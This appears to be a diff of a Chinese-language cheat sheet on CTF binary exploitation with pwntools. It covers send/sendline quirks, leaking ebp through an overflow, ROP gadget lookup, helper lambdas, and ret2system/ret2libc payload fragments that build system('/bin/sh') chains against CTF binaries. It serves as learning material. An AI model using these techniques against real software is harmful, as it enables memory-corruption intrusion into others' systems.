@@ -1,8 +1,18 @@
-## scanf用sendline, read用send
-## 溢出读取ebp值
-sendline 发送时\n 会占一个字符 0x4大小发 `sendline 'a'*4` 会发5个字符引发问题。
+## 各函数的细节区别 scanf 用 sendline, read 用 send
+
+| 函数名 | pwn 工具 | 输出的区别     |
+| ------ | -------- | -------------- |
+| scanf  | sendline |                |
+| read   | send     |                |
+| puts   |          | 发送后追加`\n` |
+| printf |          | 不追加`\n`     |
+
+## 溢出读取 ebp 值
+
+sendline 发送时\n 会占一个字符 0x4 大小发 `sendline 'a'*4` 会发 5 个字符引发问题。
 
 举例
+
 ```c
 char s[40]; // [ebp-28h]
 read(0, s, 0x30u);
@@ -15,11 +25,14 @@ p.send(payload1)  # not sendline
 p.recvuntil("B")
 original_ebp = u32(p.recv(4))
 ```
+
 ### 填充指定大小
+
 ```py
 'a'.ljust(268, ' ')
 ```
-## 使用默认的libc
+
+## 使用默认的 libc
 
 ```
 elf = ELF("./canary")
@@ -35,16 +48,18 @@ pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
 pop_rsi = ROP(elf).find_gadget(['pop rsi'])[0]
 print(hex(pop_rdi))
 ```
+
 ## snippets
+
 ```python
-ss = lambda data: p.send(str(data))
-sa = lambda delim, data: p.sendafter(str(delim), str(data))
-sl = lambda data: p.sendline(data)
-sls = lambda data: p.sendline(str(data))
-sla = lambda delim, data: p.sendlineafter(str(delim), str(data))
-r = lambda num: p.recv(num)
-ru = lambda delims, drop=True: p.recvuntil(delims, drop)
-itr = lambda: p.interactive()
+ss = lambda data: s.send(str(data))
+sa = lambda delim, data: s.sendafter(str(delim), str(data))
+sl = lambda data: s.sendline(data)
+sls = lambda data: s.sendline(str(data))
+sla = lambda delim, data: s.sendlineafter(str(delim), str(data))
+r = lambda num: s.recv(num)
+ru = lambda delims, drop=True: s.recvuntil(delims, drop)
+itr = lambda: s.interactive()
 uu32 = lambda data: u32(data.ljust(4, b'\x00'))
 uu64 = lambda data: u64(data.ljust(8, b'\x00'))
 leak = lambda name, addr: log.success('{} = {:#x}'.format(name, addr))
@@ -66,6 +81,7 @@ rop.call(system, [bin_sh]) # 栈对齐
 
 # 方式2 不加ret 加参数 rop.call(system, [bin_sh, '0']) # 栈对齐
 ```
+
 ## ret2system
 
 ```sh
@@ -78,6 +94,7 @@ payload = payload.ljust(0x28, '\x00')
 # rop
 
 见 pwn_01_stack_03_ret2libc_x64_00_ctfhub_bypwntool_rop.py
+
 ```sh
 rop = ROP('./ret2libc') # x64
 rop.raw(b'A' * (144 + 8))  # 填充144 + fake_rbp(8) 个字节的数据到缓冲区中
